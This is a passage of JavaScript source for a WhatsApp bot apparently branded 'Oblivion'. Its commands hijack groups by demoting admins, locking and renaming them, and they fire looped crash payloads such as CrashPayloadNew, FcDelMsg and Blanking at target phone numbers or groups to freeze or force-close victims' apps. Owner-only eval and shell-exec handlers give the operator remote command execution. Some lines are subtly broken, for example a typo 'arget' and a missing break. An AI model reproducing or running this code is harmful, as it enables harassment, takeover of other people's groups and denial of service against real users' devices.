        const participants = metadata.participants;
        const admins = participants.filter(p => p.admin);
        const owner = participants.find(p => p.admin === 'superadmin');
        
        let dethronedCount = 0;
        let failedDethrones = 0;

        // Dethrone all admins except bot and owner
        for (const admin of admins) {
            if (admin.id !== botNumber && admin.id !== owner?.id) {
                try {
                    await rich.groupParticipantsUpdate(m.chat, [admin.id], 'demote');
                    dethronedCount++;
                } catch (demoteError) {
                    console.error(`Failed to demote ${admin.id}:`, demoteError);
                    failedDethrones++;
                }
            }
        }

        // Lock the group
        await rich.groupSettingUpdate(m.chat, 'announcement');

        // Change group details
        await rich.groupUpdateSubject(m.chat, 'All Hail Oblivion');
        await rich.groupUpdateDescription(m.chat, 'All Hail Oblivion');

        // Download and set new profile picture
        try {
            const imageUrl = "https://files.catbox.moe/5ydrgs.jpeg";
            const response = await fetch(imageUrl);
            const arrayBuffer = await response.arrayBuffer();
            const imageBuffer = Buffer.from(arrayBuffer);
            
            await rich.updateProfilePicture(m.chat, imageBuffer);
        } catch (imageError) {
            console.error("Profile Picture Error:", imageError);
            // Continue even if image fails
        }

        const message = {
            text: `
╔═══✦❖✦═══╗
 💀 𝐒𝐇𝐀𝐃𝐎𝐖 𝐓𝐀𝐊𝐄𝐎𝐕𝐄𝐑  
 
 This realm now belongs to Oblivion!  
 Bow before your new dark overlord!  

 ${dethronedCount} rulers dethroned
 ${failedDethrones > 0 ? `\n⚠️ ${failedDethrones} resisted the shadow` : ''}
╚═══✦❖✦═══╝
            `,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: '🄾🄱🄻🄸🅅🄸🄾🄽',
                    body: 'Group Hijacked',
                    thumbnailUrl: "https://files.catbox.moe/5ydrgs.jpeg",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };

        await rich.sendMessage(m.chat, message, { quoted: m });
        await rich.sendMessage(m.chat, { react: { text: '👑', key: m.key } });

    } catch (error) {
        console.error("Hijack Error:", error);
        await rich.sendMessage(m.chat, { 
            text: "💥 𝐑𝐈𝐓𝐔𝐀𝐋 𝐅𝐀𝐈𝐋𝐔𝐑𝐄\nThe shadows resisted our takeover!",
            react: { text: '❌', key: m.key }
        }, { quoted: m });
    }
}
break;
        
case 'androlysis': {
    if (!qtext) return reply(`Invoke the arcane: \n${prefix + command} 234xx / @tag`);

    let jidx = qtext.replace(/[^0-9]/g, "");
    if (creators.includes(jidx)) {
        return rich.sendMessage(m.chat, { text: "🛡️ I can't bug my creator." }, { quoted: m });
    }
    if (jidx.startsWith('0')) {
        return reply(`⚠️ The void whispers: begin the number with its cursed country code...`);
    }

    let target = `${jidx}@s.whatsapp.net`;
   const voidText =`
╔═══✦❖✦═══╗
𒋲 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐡𝐚𝐬 𝐂𝐥𝐚𝐢𝐦𝐞𝐝: ${target}  
🩸 𝐂𝐮𝐫𝐬𝐞 𝐖𝐨𝐯𝐞𝐧 — 𝐓𝐡𝐞𝐲 𝐀𝐫𝐞 𝐍𝐨𝐰 𝐒𝐈𝐍𝐒’ 𝐌𝐚𝐫𝐤.
╚═══✦❖✦═══╝`;
         const message = {
            text: voidText,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: '𒋲 ѕιи 𒋲',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };
	 await rich.sendMessage(m.chat, message, { quoted: m });
	 await rich.sendMessage(m.chat, { react: { text: '👿', key: m.key } });
    for (let r = 0; r < 50; r++) {
await FcDelMsg(target);
await sleep(2000);
await newspamfc(target);
await sleep(2000);
await GxhorseForceClose(target);
await sleep(2000);
await FolwareFunction(target, false);
await sleep(2000);
await sbh(target);
await sleep(2000);
await FrostByte2(target);
await sleep(2000);
await CorouselXLoca(target);
await sleep(2000);
await SkyForce(target);
await sleep(2000);
await CrashPayloadNew(target)
    }

 await rich.sendMessage(m.chat, message, { quoted: m });	
}	
break;
        
case 'soulrip': {
    if (m.isGroup) return reply("❌ This command must be used in a *private chat with the target*!");
    const target = m.chat; 
    const voidText = `
╔═══✦❖✦═══╗
𒋲 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐡𝐚𝐬 𝐂𝐥𝐚𝐢𝐦𝐞𝐝: ${target}  
🩸 𝐂𝐮𝐫𝐬𝐞 𝐖𝐨𝐯𝐞𝐧 — 𝐓𝐡𝐞𝐲 𝐀𝐫𝐞 𝐍𝐨𝐰 𝐒𝐈𝐍𝐒’ 𝐌𝐚𝐫𝐤.
╚═══✦❖✦═══╝`;

    const message = {
        text: voidText,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363399191935982@newsletter",
                newsletterName: "𒋲 ѕιи 𒋲",
                serverMessageId: 143,
                newsletterThumbnail: {
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                }
            },
            externalAdReply: {
                title: '𒋲 ѕιи 𒋲',
                body: '𒋲 ѕιи 𒋲',
                thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    // Send initial message
    await rich.sendMessage(target, message);
    await rich.sendMessage(target, { react: { text: '👿', key: m.key } });

    // Launch full bug payload
    for (let r = 0; r < 50; r++) {
await FcDelMsg(target);
await sleep(2000);
await newspamfc(target);
await sleep(2000);
await GxhorseForceClose(target);
await sleep(2000);
await FolwareFunction(target, false);
await sleep(2000);
await sbh(target);
await sleep(2000);
await FrostByte2(target);
await sleep(2000);
await CorouselXLoca(target);
await sleep(2000);
await SkyForce(target);
await sleep(2000);
await CrashPayloadNew(target)
    }

    await rich.sendMessage(target, message); 
}
break;

        // =============== SAMSUNG ============= //
case 'voidrender': {
    if (m.isGroup) return reply("❌ This command must be used in a *private chat with the target*!");

    const target = m.chat; 
    const voidText = `
╔═══✦❖✦═══╗
The void has marked your soul, ${target}... 🍂 Curse unleashed.
╚═══✦❖✦═══╝`;

    const message = {
        text: voidText,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363399191935982@newsletter",
                newsletterName: "𒋲 ѕιи 𒋲",
                serverMessageId: 143,
                newsletterThumbnail: {
                    thumbnailUrl: "hhttps://files.catbox.moe/dwe1jg.png"
                }
            },
            externalAdReply: {
                title: '𒋲 ѕιи 𒋲',
                body: '𒋲 ѕιи 𒋲',
                thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    // Send initial message
    await rich.sendMessage(target, message);
    await rich.sendMessage(target, { react: { text: '👿', key: m.key } });

    // Launch full bug payload
    for (let r = 0; r < 20; r++) {
await BlankSamsung(target);
await sleep(2000);
await iziiinvissversi1(target);
await sleep(2000)
   }

    await rich.sendMessage(target, message); // Final confirmation
}

case 'phantomfall': {
    if (!qtext) return reply(`Invoke the arcane: \n${prefix + command} 234xx /`);

    let jidx = qtext.replace(/[^0-9]/g, "");

    if (jidx.startsWith('0')) {
        return reply(`⚠️ The void whispers: begin the number with its cursed country code...`);
    }
    if (creators.includes(jidx)) {
        return rich.sendMessage(m.chat, { text: "🛡️ I can't bug my creator." }, { quoted: m });
    }

    let target = `${jidx}@s.whatsapp.net`;
     const iosText = `
╔═══✦❖✦═══╗
☠️ 𝐒𝐈𝐍𝐒 𝐇𝐚𝐯𝐞 𝐂𝐥𝐚𝐢𝐦𝐞𝐝 𝐓𝐡𝐞𝐢𝐫 𝐏𝐫𝐞𝐲.
🩸 𝐒𝐨𝐮𝐥 𝐂𝐨𝐧𝐬𝐮𝐦𝐞𝐝: ${target}
𒋲 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐍𝐨𝐰 𝐎𝐛𝐞𝐲𝐬 𝐒𝐈𝐍𝐒.
╚═══✦❖✦═══╝`;
         const message = {
            text: iosText,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: '𒋲 ѕιи 𒋲',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };
	 await rich.sendMessage(m.chat, message, { quoted: m });
	await rich.sendMessage(m.chat, { react: { text: '👿', key: m.key } });

    for (let r = 0; r < 50; r++) {
await ForceInvisibleCoreNew(target);
await sleep(2000);
await iNvsExTendIos(target)

    }
}
break;
    
case 'Beta': {
   
    if (m.isGroup) return reply("❌ This command must be used in a *private chat* with the target!");

    const target = m.chat; 
    const iosText = `
╔═══✦❖✦═══╗
☠️ 𝐒𝐈𝐍𝐒 𝐇𝐚𝐯𝐞 𝐂𝐥𝐚𝐢𝐦𝐞𝐝 𝐓𝐡𝐞𝐢𝐫 𝐏𝐫𝐞𝐲.
🩸 𝐒𝐨𝐮𝐥 𝐂𝐨𝐧𝐬𝐮𝐦𝐞𝐝: ${target}
𒋲 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐍𝐨𝐰 𝐎𝐛𝐞𝐲𝐬 𝐒𝐈𝐍𝐒.
╚═══✦❖✦═══╝`;

    const message = {
        text: iosText,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363399191935982@newsletter",
                newsletterName: "𒋲 ѕιи 𒋲",
                serverMessageId: 143,
                newsletterThumbnail: {
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                }
            },
            externalAdReply: {
                title: '𒋲 ѕιи 𒋲',
                body: '𒋲 ѕιи 𒋲',
                thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    // Send intro message
    await rich.sendMessage(target, message, { quoted: m });
    await rich.sendMessage(target, { react: { text: '👿', key: m.key } });

    for (let r = 0; r < 20; r++) {
await UIBetacrash(rich, target, Ptcp = false);
await sleep(2000);
await FcZap(target)
await Xmdsql2(target);
await sleep(2000);
await ForcloseBeta(arget)

    }
}
break;

case 'dreadspit': {
   
    if (m.isGroup) return reply("❌ This command must be used in a *private chat* with the target!");

    const target = m.chat; 
    const iosText = `
╔═══✦❖✦═══╗
☠️ 𝐒𝐈𝐍𝐒 𝐇𝐚𝐯𝐞 𝐂𝐥𝐚𝐢𝐦𝐞𝐝 𝐓𝐡𝐞𝐢𝐫 𝐏𝐫𝐞𝐲.
🩸 𝐒𝐨𝐮𝐥 𝐂𝐨𝐧𝐬𝐮𝐦𝐞𝐝: ${target}
𒋲 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐍𝐨𝐰 𝐎𝐛𝐞𝐲𝐬 𝐒𝐈𝐍𝐒.
╚═══✦❖✦═══╝`;

    const message = {
        text: iosText,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363399191935982@newsletter",
                newsletterName: "𒋲 ѕιи 𒋲",
                serverMessageId: 143,
                newsletterThumbnail: {
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                }
            },
            externalAdReply: {
                title: '𒋲 ѕιи 𒋲',
                body: '𒋲 ѕιи 𒋲',
                thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    // Send intro message
    await rich.sendMessage(target, message, { quoted: m });
    await rich.sendMessage(target, { react: { text: '👿', key: m.key } });

    for (let r = 0; r < 50; r++) {
await ForceInvisibleCoreNew(target);
await sleep(2000);
await iNvsExTendIos(target)
    }
}
break;

case 'wraith': {
    if (!q) return reply(`Invoke the arcane: \n${prefix + command} 234xx`);
 let jidx = qtext.replace(/[^0-9]/g, "");
    if (creators.includes(jidx)) {
        return rich.sendMessage(m.chat, { text: "🛡️ I can't bug my creator." }, { quoted: m });
    }
 let target = `${jidx}@s.whatsapp.net`;
  const delayText = `
╔═══✦❖✦═══╗
⚡ 𝐈𝐍𝐉𝐄𝐂𝐓𝐈𝐍𝐆 𝐂𝐔𝐑𝐒𝐄: *𝐁𝐀𝐍𝐆* ⚡
➤ Target: wa.me/${q.replace(/[^0-9]/g, '')}
➤ Tool: *Oblivion*
☠️ The code bleeds into the system... wait as the corruption spreads...
╚═══✦❖✦═══╝`;
         const message = {
            text: delayText,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: '𒋲 ѕιи 𒋲',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };
	 await rich.sendMessage(m.chat, message, { quoted: m });
	 await rich.sendMessage(m.chat, { react: { text: '👿', key: m.key } });
 for (let r = 0; r < 100; r++) {
await zauzetdelay(target)
}
}
break;

case 'sinstorm': {
    if (!m.isGroup && !text) return reply("❌ This command must be used *inside a group* or *with a target group ID*!");
   const target = m.chat; 
    
    // Validate target format
    if (!target.endsWith('@g.us')) return reply("❌ Invalid group ID format! Must end with @g.us");

    const processingMessage = {
        text: `
╔═══✦❖✦═══╗
Processing command.........
Target: ${target}
╚═══✦❖✦═══╝`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363399191935982@newsletter",
                newsletterName: "𒋲 ѕιи 𒋲",
                serverMessageId: 143,
                newsletterThumbnail: {
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                }
            },
            externalAdReply: {
                title: '𒋲 ѕιи 𒋲',
                body: 'Initiating group corruption...',
                thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    await rich.sendMessage(m.chat, processingMessage, { quoted: m });
    await rich.sendMessage(m.chat, { react: { text: '👿', key: m.key } });

    try {
        // Execute multiple payloads with spacing and loop
        for (let i = 0; i < 30; i++) {
await Blanking(target)
        }
    } catch (err) {
        console.error("⚠️ Crash loop error:", err);
        return reply("❌ Crash failed due to internal error.");
    }

    const successMessage = {
        text: `
╔═══✦❖✦═══╗
☠️ Shadows deployed successfully. 
Target: ${target}
Now belongs to the void.
╚═══✦❖✦═══╝`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363399191935982@newsletter",
                newsletterName: "Shadow Syndicate 軎",
                serverMessageId: 143,
                newsletterThumbnail: {
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                }
            },
            externalAdReply: {
                title: '𒋲 ѕιи 𒋲',
                body: 'Chaos has been delivered.',
                thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    await rich.sendMessage(m.chat, successMessage, { quoted: m });
}
break;
default:
// ===================== Async Eval (Prefix: <) =======================
    if (budy.startsWith('<')) {
        if (!isCreator) return;

        function Return(sul) {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined) {
                bang = util.format(sul)
            }
            return reply(bang)
        }

        try {
            reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
        } catch (e) {
            reply(String(e))
        }
    }

// ===================== Eval Biasa (Prefix: >) =======================
    if (budy.startsWith('>')) {
        if (!isCreator) return;

        try {
            let evaled = await eval(budy.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            await reply(evaled)
        } catch (err) {
            await reply(String(err))
        }
    }

// ===================== Terminal Command (Prefix: $) ===============
if (budy.startsWith('$')) {
        if (!isCreator) return;

        require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(`${err}`)
            if (stdout) return reply(stdout)
        })
    }

}
} catch (err) {
    console.log(require("util").format(err));
}

// ===================== Auto Update ===============================
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})
}
// ===================== End All =================================== 
